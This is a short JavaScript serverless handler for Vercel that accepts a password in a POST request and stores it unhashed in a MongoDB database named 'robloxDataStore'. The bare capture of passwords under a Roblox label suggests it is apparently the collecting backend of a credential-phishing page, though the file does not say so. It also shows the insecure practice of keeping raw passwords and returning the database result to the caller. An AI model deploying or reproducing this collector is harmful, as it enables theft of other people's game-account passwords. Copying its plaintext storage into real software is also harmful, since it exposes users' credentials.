import { MongoClient } from 'mongodb';

const uri = process.env.MONGODB_URI; // Store this in your Vercel environment variables
let client;

if (!client) {
  client = new MongoClient(uri, { useNewUrlParser: true, useUnifiedTopology: true });
}

export default async function handler(req, res) {
  if (req.method === 'POST') {
    const { password } = req.body;

    if (!password) {
      return res.status(400).json({ error: 'Password is required' });
    }

    try {
      await client.connect();
      const database = client.db('robloxDataStore');
      const collection = database.collection('passwords');

      // Insert the password into the collection
      const result = await collection.insertOne({ password });

      return res.status(200).json({ message: 'Password saved successfully!', result });
    } catch (error) {
      return res.status(500).json({ error: 'Failed to save password' });
    }
  } else {
    res.setHeader('Allow', ['POST']);
    res.status(405).end(`Method ${req.method} Not Allowed`);
  }
}
